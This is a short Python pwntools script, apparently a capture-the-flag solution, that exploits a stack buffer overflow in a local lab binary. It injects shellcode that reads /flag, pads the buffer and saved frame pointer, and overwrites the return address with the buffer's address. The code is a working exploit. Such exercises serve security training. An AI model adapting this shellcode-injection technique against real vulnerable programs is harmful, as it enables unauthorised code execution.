#!/usr/bin/python

from pwn import *

context(arch="amd64", os="linux")
shellcode = asm(shellcraft.cat("/flag"))

buf_addr = p64(0x12340000)

payload = shellcode
payload += cyclic(0x100 - len(payload)) # 填充缓冲区
payload += cyclic(8)  # saved_rbp
payload += buf_addr # 覆盖返回地址
print(payload)

sh = process("/challenge/shellcode-injection-level3.2")
sh.sendline(payload)
sh.interactive()
